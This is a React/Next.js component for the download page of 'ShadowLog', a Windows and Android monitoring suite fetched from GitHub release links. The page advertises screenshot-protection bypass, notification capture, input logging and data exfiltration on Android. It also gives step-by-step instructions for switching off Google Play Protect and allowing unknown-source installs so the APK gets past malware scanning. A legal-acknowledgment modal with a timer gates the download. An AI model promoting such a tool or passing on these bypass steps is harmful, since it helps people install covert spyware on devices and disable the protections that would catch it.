'use client';

import { useState, useEffect, useRef, useCallback } from 'react';
import Link from 'next/link';

const TIMER_DURATION = 10;
const CIRCUMFERENCE = 2 * Math.PI * 36;
const DOWNLOAD_URL = 'https://github.com/BGx-11/ShadowLog/releases/latest/download/ShadowLog_Win_v4.0.zip';

export default function DownloadSection() {
  const [modalOpen, setModalOpen] = useState(false);
  const [timerValue, setTimerValue] = useState(TIMER_DURATION);
  const [timerDone, setTimerDone] = useState(false);
  const [checks, setChecks] = useState([false, false]);
  const intervalRef = useRef(null);

  const allChecked = checks.every(Boolean);
  const ready = timerDone && allChecked;

  const openModal = useCallback(() => {
    setModalOpen(true);
    setTimerValue(TIMER_DURATION);
    setTimerDone(false);
    setChecks([false, false]);
    document.body.style.overflow = 'hidden';
  }, []);

  const closeModal = useCallback(() => {
    setModalOpen(false);
    document.body.style.overflow = '';
    if (intervalRef.current) clearInterval(intervalRef.current);
  }, []);

  useEffect(() => {
    if (!modalOpen) return;
    intervalRef.current = setInterval(() => {
      setTimerValue((prev) => {
        if (prev <= 1) {
          clearInterval(intervalRef.current);
          setTimerDone(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(intervalRef.current);
  }, [modalOpen]);

  const toggleCheck = (index) => {
    setChecks((prev) => {
      const copy = [...prev];
      copy[index] = !copy[index];
      return copy;
    });
  };

  const handleDownload = () => {
    if (!ready) return;
    window.location.href = DOWNLOAD_URL;
    setTimeout(closeModal, 2000);
  };

  const progress = (TIMER_DURATION - timerValue) / TIMER_DURATION;
  const dashOffset = progress * CIRCUMFERENCE;

  return (
    <>
      <section className="section" id="download">
        <div className="container">
          <div className="sectionHeader reveal">
            <span className="sectionLabel">Release</span>
            <h2 className="sectionTitle">Download ShadowLog</h2>
          </div>

          <div className="downloadArea reveal delay-1">
            <h2>ShadowLog Master Release</h2>
            <p>Contains the compiled monitor, local forensic decryptor dashboard, and complete system uninstaller.</p>
            
            <div className="downloadMeta">
              <div className="metaBadge">Version 4.0</div>
              <div className="metaBadge">Windows x64</div>
              <div className="metaBadge">10.3 MB</div>
            </div>

            <button className="btn btn-primary btn-lg" onClick={openModal}>
              <svg className="btn-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
              Acquire Archive
            </button>
          </div>

          <div className="downloadArea downloadAreaMobile reveal delay-2">
            <div className="downloadPlatformBadge">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
              Android Edition
            </div>
            <h2>ShadowLog Mobile</h2>
            <p>Full Android monitoring suite with FLAG_SECURE screenshot bypass, notification capture, input logging, and quad-channel exfiltration.</p>
            
            <div className="downloadMeta">
              <div className="metaBadge">Version 2.0</div>
              <div className="metaBadge">Android 8.0+</div>
              <div className="metaBadge">~2.1 MB each</div>
            </div>

            {/* ── INLINE PLAY PROTECT BYPASS GUIDE ── */}
            <div className="installGuide">
              <div className="installGuideHeader">
                <div className="installGuideIcon">
                  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
                </div>
                <div>
                  <h3>⚠️ Required: Disable Play Protect First</h3>
                  <p>Play Protect <strong>will block installation</strong>. Complete these steps before downloading.</p>
                </div>
              </div>

              <div className="installSteps">
                <div className="installStep">
                  <div className="installStepNum">1</div>
                  <div className="installStepText">
                    Open the <strong>Google Play Store</strong> app
                  </div>
                </div>
                <div className="installStep">
                  <div className="installStepNum">2</div>
                  <div className="installStepText">
                    Tap your <strong>profile icon</strong> (top-right) → tap <strong>Play Protect</strong>
                  </div>
                </div>
                <div className="installStep">
                  <div className="installStepNum">3</div>
                  <div className="installStepText">
                    Tap the <strong>⚙ Settings gear</strong> (top-right corner)
                  </div>
                </div>
                <div className="installStep">
                  <div className="installStepNum">4</div>
                  <div className="installStepText">
                    Toggle <strong>OFF</strong> &quot;Scan apps with Play Protect&quot; → confirm <strong>&quot;Turn off&quot;</strong>
                  </div>
                </div>
                <div className="installStep">
                  <div className="installStepNum">5</div>
                  <div className="installStepText">
                    Download &amp; install the APK below — it will go through now
                  </div>
                </div>
                <div className="installStep">
                  <div className="installStepNum">6</div>
                  <div className="installStepText">
                    <strong>Re-enable Play Protect</strong> after installing (same path, toggle back ON)
                  </div>
                </div>
              </div>

              <div className="installTip">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
                <span><strong>Still blocked?</strong> Go to <strong>Settings → Apps → Google Play Store → Force Stop</strong>, then retry. On Samsung/Xiaomi, also check <strong>Settings → Security → Install Unknown Apps</strong> and allow your browser.</span>
              </div>
            </div>

            {/* ── ANDROID ARCHIVE DOWNLOAD ── */}
            <div className="apkDownloadGrid" style={{ gridTemplateColumns: '1fr' }}>
              <a href="https://github.com/BGx-11/ShadowLog/releases/latest/download/ShadowLog_Android_v4.0.zip" className="apkCard" download>
                <div className="apkCardIcon">
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                </div>
                <div className="apkCardContent">
                  <strong>Android Release Archive</strong>
                  <span>Contains Monitor, Controller, and USB Installer</span>
                </div>
                <svg className="apkCardArrow" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
              </a>
            </div>
          </div>
        </div>
      </section>

      <div className={`modalOverlay ${modalOpen ? 'modalOverlayActive' : ''}`} onClick={(e) => { if (e.target === e.currentTarget) closeModal(); }}>
        <div className="modal">
          <div className="modalIcon">
            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
          </div>
          <h2>Security Acknowledgment</h2>
          <p>This is a powerful systems monitoring framework. Unauthorized surveillance is a serious criminal offense under the CFAA and international privacy laws.</p>

          <label className="checkboxItem">
            <input type="checkbox" checked={checks[0]} onChange={() => toggleCheck(0)} />
            <span>I confirm I will ONLY deploy this on systems I personally own or have explicit written authorization to monitor.</span>
          </label>
          <label className="checkboxItem">
            <input type="checkbox" checked={checks[1]} onChange={() => toggleCheck(1)} />
            <span>I have read the <Link href="/terms" target="_blank" onClick={e => e.stopPropagation()}>Terms of Service</Link> and <Link href="/privacy" target="_blank" onClick={e => e.stopPropagation()}>Privacy Policy</Link> and accept full personal legal responsibility for my use of this software.</span>
          </label>

          <div className="timerRingContainer">
            <div className="timerRing">
              <svg viewBox="0 0 80 80">
                <circle className="timerRingBg" cx="40" cy="40" r="36"/>
                <circle className="timerRingProgress" cx="40" cy="40" r="36" style={{ strokeDasharray: CIRCUMFERENCE, strokeDashoffset: dashOffset }}/>
              </svg>
              <div className="timerText">{timerDone ? '✓' : timerValue}</div>
            </div>
          </div>

          <button className="btn btn-primary downloadFinalBtn" disabled={!ready} onClick={handleDownload}>
            {ready ? 'Download Now' : 'Awaiting Acknowledgment...'}
          </button>
        </div>
      </div>
    </>
  );
}
